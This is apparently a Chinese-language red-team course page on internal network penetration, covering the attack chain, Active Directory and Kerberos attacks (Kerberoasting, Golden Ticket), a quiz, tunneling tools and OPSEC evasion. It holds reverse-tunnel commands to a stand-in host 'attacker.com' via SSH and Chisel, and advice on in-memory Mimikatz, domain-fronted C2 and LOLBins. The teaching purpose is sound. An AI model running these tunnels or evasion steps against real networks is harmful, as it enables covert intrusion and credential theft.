內網滲透概論與攻擊鏈

內網滲透（Internal Network Penetration）是在已獲得初始立足點後，在目標組織內部網路中持續擴大權限和訪問範圍的過程。這是紅隊演練的核心技術，也是真實 APT 攻擊的主要手段。

內網攻擊鏈（Cyber Kill Chain 內網版）

STEP 1
獲取初始立足點（Initial Access）
通過 Web 漏洞利用（Stage 4）、釣魚郵件（Phishing）、供應鏈攻擊、VPN/RDP 爆破等手段，在目標內網中獲得第一個受控主機。這一步決定了後續攻擊的起點。
STEP 2
本地偵察（Local Recon）
在立足點主機上收集信息：操作系統版本、本地用戶和群組、網路配置（IP/路由/ARP）、已安裝軟件、運行中進程、共享資源、域成員身份。
STEP 3
本地提權（Local Privilege Escalation）
從普通用戶提升到 SYSTEM / Administrator，獲得更高本地權限，為後續憑證提取和橫向移動做準備。常用：未修補漏洞、服務錯誤配置、SeImpersonatePrivilege。
STEP 4
憑證收集（Credential Harvesting）
使用 Mimikatz 等工具從 LSASS 記憶體、NTDS.dit、SAM 資料庫中提取 NTLM Hash、Kerberos Ticket、明文密碼。憑證是內網移動的「萬能鑰匙」。
STEP 5
橫向移動（Lateral Movement）
利用收集的憑證（Hash / Ticket）通過 WMI、WinRM、SMB、RDP 等協議，在內網其他主機上執行代碼，逐步擴大控制範圍，向高價值目標（域控 DC）推進。
STEP 6
域控接管（Domain Compromise）
獲取域管理員權限（Domain Admin）或域控制器（DC）的 SYSTEM 權限。執行 DCSync 獲取所有域帳號 Hash，實現對整個域環境的完全控制。

內網環境核心概念

Active Directory（AD）
微軟的目錄服務，企業內網的核心基礎設施。管理用戶帳號、電腦帳號、群組策略、認證授權。90% 以上的企業內網使用 AD。理解 AD 是內網滲透的根本。
域控制器（DC）
運行 AD DS（Directory Services）的 Windows Server，是整個域的「大腦」。存儲所有域帳號的憑證（NTDS.dit）、管理 Kerberos 認證、執行群組策略。控制 DC = 控制整個域。
NTLM 認證
Windows 的本地認證協議（Challenge-Response 機制）。核心是 NTLM Hash（NT Hash），不需要明文密碼即可認證（Pass-the-Hash 攻擊的基礎）。
Kerberos 認證
AD 環境中的標準認證協議。基於票證（Ticket）機制，TGT（票證授權票證）和 ST（服務票證）是攻擊目標。Kerberoasting、Golden Ticket 等攻擊均基於此。
授權要求

內網滲透測試必須在明確的書面授權範圍內進行，且通常要求更嚴格的授權文件（如風險確認書、緊急聯繫機制）。Stage 7 的所有技術只能在以下環境練習：自建的 Active Directory 實驗室（推薦 GOAD、DetectionLab）、HackTheBox / TryHackMe 的 AD 靶機（Pro Lab: RastaLabs、Offshore）、已獲得書面授權的客戶環境。

內網掃描：存活發現與端口掃描

在受控主機上對內網進行掃描，目的是找到其他存活主機、開放服務，以及可能的攻擊路徑。內網掃描需要比外網更謹慎，避免觸發 IDS/EDR 告警。

Windows 10 / 11 防護措施

AD 架構：域 / 樹 / 森林 / 信任

Active Directory 是企業內網的核心，理解其架構是進行域滲透的先決條件。AD 採用層次化的命名空間結構，安全邊界和信任關係決定了橫向移動的可能路徑。

概念說明攻擊意義
域（Domain）AD 的基本管理單位（如 corp.local）。域內的所有用戶、電腦、群組共享同一份目錄數據庫（NTDS.dit），由域控制器（DC）管理。取得 Domain Admin = 控制整個域的所有資源
樹（Tree）共享連續命名空間的多個域（如 corp.local + hk.corp.local + us.corp.local）。父子域之間自動建立雙向傳遞信任。父子域信任可用於跨域攻擊（子域到父域）
森林（Forest）共享 Schema 和 Configuration 的多棵樹的集合。是 AD 的最大安全邊界。森林根域（Forest Root Domain）持有最高特權。森林信任（Forest Trust）是跨森林攻擊的橋樑
信任（Trust）允許一個域的用戶訪問另一個域資源的授權關係。分為單向/雙向、傳遞性/非傳遞性。枚舉信任關係是跨域滲透的第一步
OU（組織單位）域內的邏輯容器，用於組織對象和應用群組策略（GPO）。高特權 OU 的 GPO 可部署惡意腳本到所有成員
GPO（群組策略）集中配置域成員電腦和用戶設定的機制。可部署軟件、執行腳本、配置安全設定。修改 GPO = 控制所有受影響的機器（高價值目標）

Kerberos 認證協議深入解析

Kerberos 是 AD 環境中的標準認證協議，理解其工作流程是掌握 Kerberoasting、Golden Ticket、Pass-the-Ticket 等多種攻擊技術的前提。

Kerberos 認證流程

AS-REQ
用戶向 KDC 請求 TGT
用戶客戶端向 KDC（Key Distribution Center，在 DC 上）發送 AS-REQ，包含用戶名和使用用戶密碼 Hash 加密的時間戳。若帳號設置了「不需要預認證」（Kerberos Pre-Auth 禁用），則 KDC 不驗證身份直接返回加密數據，這是 AS-REP Roasting 的利用點。
AS-REP
KDC 返回 TGT
KDC 驗證後，返回 AS-REP：包含 TGT（Ticket Granting Ticket），使用 krbtgt 帳號的 NTLM Hash 加密。客戶端只能使用 TGT，無法解密它。TGT 預設有效期 10 小時。
TGS-REQ
用戶請求服務票證（ST）
用戶要訪問某服務（如 MSSQL），將 TGT 發送給 KDC，請求該服務的 Service Ticket（ST）。請求中包含目標服務的 SPN（Service Principal Name），如 MSSQLSvc/sqlserver.corp.local:1433。
TGS-REP
KDC 返回服務票證
KDC 使用目標服務帳號的 NTLM Hash 加密服務票證，返回給客戶端。關鍵點：服務票證是用服務帳號的 Hash 加密的，可以對其進行離線爆破——這就是 Kerberoasting。
AP-REQ
客戶端向服務出示票證
客戶端將服務票證提交給目標服務，服務用自己的 Hash 解密驗證，無需聯繫 KDC。這意味著：如果攻擊者有 krbtgt Hash，可以偽造任意 TGT（Golden Ticket）；有服務 Hash，可以偽造服務票證（Silver Ticket）。
關鍵 Hash 對應

krbtgt Hash → 可偽造任意 TGT（Golden Ticket），等於永久控制整個域。
服務帳號 Hash → 可偽造對應服務的 ST（Silver Ticket），可以在不聯繫 KDC 的情況下訪問服務。
NTLM Hash → Pass-the-Hash 攻擊，或提交給 KDC 做 Pass-the-Key 認證。

小測驗
在域滲透中，攻擊者使用 BloodHound 收集數據後，發現用戶 jdoe 的賬號屬性中 hasspn:true。這意味著可以對 jdoe 發動哪種攻擊？
AAS-REP Roasting（不需要預認證攻擊）
BKerberoasting（請求服務票證並離線爆破 Hash）

正確！hasspn:true 表示該帳號設置了服務主體名稱（SPN），意味著它是一個服務帳號。Kerberoasting 的原理是：任何域用戶都可以向 KDC 請求有 SPN 帳號的服務票證（TGS），而該票證是用服務帳號的 NTLM Hash 加密的，可以在離線環境中暴力破解。AS-REP Roasting 對應的是 PreauthNotRequired:true（不需預認證）屬性；Pass-the-Hash 需要先獲得 Hash；DCSync 需要特殊 AD 複製權限。

Kerberoasting：服務帳號 Hash 提取

Kerberoasting 是域滲透中最常用、最有效的攻擊之一：任何域用戶（即使是最低權限）都可以請求有 SPN 服務帳號的服務票證，然後對票證進行離線爆破，無需與目標服務交互，幾乎不產生告警。

Kerberoasting 完整攻擊流程

# Hash 格式：$krb5tgs$23$*svc_sql*corp.local*MSSQLSvc/sql01:1433*...$...

# 3. 監控：4769 事件（Kerberos Service Ticket Operations），票證加密類型 0x17 = RC4

Linux 環境中最常用，利用 OpenSSH 內建功能。本地轉發：攻擊機訪問本機端口 → 轉到目標內網。反向轉發：目標機反連攻擊機 → 開放攻擊機端口供訪問。動態轉發：SOCKS5 代理，任意協議。
Chisel（推薦）
基於 HTTP/WebSocket 的隧道工具，可穿透 HTTP 代理，C/S 架構。支援 SOCKS5 代理和端口轉發兩種模式。跨平台（Linux/Windows），單一二進制。適合 HTTP 出站受限的環境。
Frp（快速反向代理）
高性能反向代理工具，適合長期維持訪問。配置文件靈活，支援 TCP/UDP/HTTP/HTTPS 轉發，支援加密和壓縮。frpc 在目標機執行，frps 在攻擊機執行。
Netsh / Plink（Windows 內建）
netsh interface portproxy 是 Windows 內建的端口轉發工具，無需額外上傳文件。Plink 是 PuTTY 的命令列版本，可在 Windows 機器上建立 SSH 隧道。
隧道工具實戰命令
# ─── SSH 隧道 ───
# 本地端口轉發：攻擊機本機 3389 → 內網 192.168.2.100:3389（通過跳板機 jump.target.com）

# 反向隧道（目標機無法從外部訪問，讓目標機主動連接攻擊機）
# 在目標機執行：
ssh -R 4444:127.0.0.1:3389 attacker@attacker.com -N -f
# 攻擊機本機 4444 = 目標機 3389

# ─── Chisel（穿透 HTTP 代理）───
# 攻擊機（Server 端）：
./chisel server --port 8080 --reverse

# 目標機（Client 端，向外發起 HTTP 連線）：
./chisel client attacker.com:8080 R:socks             # 反向 SOCKS5

# 刪除轉發規則

在極度受限的環境（只允許特定協議出站），DNS 和 ICMP 隧道可以在幾乎任何網路中建立通訊通道，因為防火牆很少阻擋 DNS 查詢和 ICMP Ping。

持久化技術：計劃任務 / 服務 / 登錄表

持久化（Persistence）確保在系統重啟、用戶登出或初始 Shell 失效後，攻擊者仍然能夠重新獲得對目標的控制。紅隊演練中的持久化必須向客戶明確聲明並在演練結束後徹底清除。

OPSEC 操作安全原則

OPSEC（Operations Security）在滲透測試中指的是在達成測試目標的同時，盡量減少可被防禦方偵測到的痕跡，以準確評估組織的防禦能力。以下是紅隊操作的核心 OPSEC 原則。

01
優先使用系統內建工具（Living off the Land） — 使用 PowerShell、WMI、certutil、bitsadmin 等系統自帶工具，比上傳第三方工具產生更少的告警。原則：能用 LOLBins 解決的，不使用自帶工具。
02
避免觸發高噪音掃描 — 限制掃描速率（nmap --scan-delay），避免大量快速的 SMB 連線（可能觸發蜜罐和 IDS），先掃小範圍確認後再擴大。
03
記憶體駐留（In-Memory Execution） — 盡量在記憶體中執行工具（Invoke-Mimikatz / Cobalt Strike execute-assembly），不落地到磁碟，避免被文件型防毒掃描到。
04
Beacon / Implant 通訊偽裝 — 使用 HTTPS + 域前置（Domain Fronting）讓 C2 流量看起來像正常的 CDN 流量；配置 Beacon Sleep 時間（如 60 秒 + 30% 抖動）模擬人工操作節奏。
05
最小化 AD 操作痕跡 — 避免使用高特徵工具（如 SharpHound 的 All 採集模式非常嘈雜）；優先使用 bloodhound-python 從 Linux 遠端採集，減少在目標機上的操作；Kerberoasting 一次性採集，不反覆請求。
06
操作時間偽裝 — 在目標組織的正常工作時間（如周一至周五 9-18 點）執行操作，模擬正常用戶行為。周末和深夜的異常操作更容易被偵測。
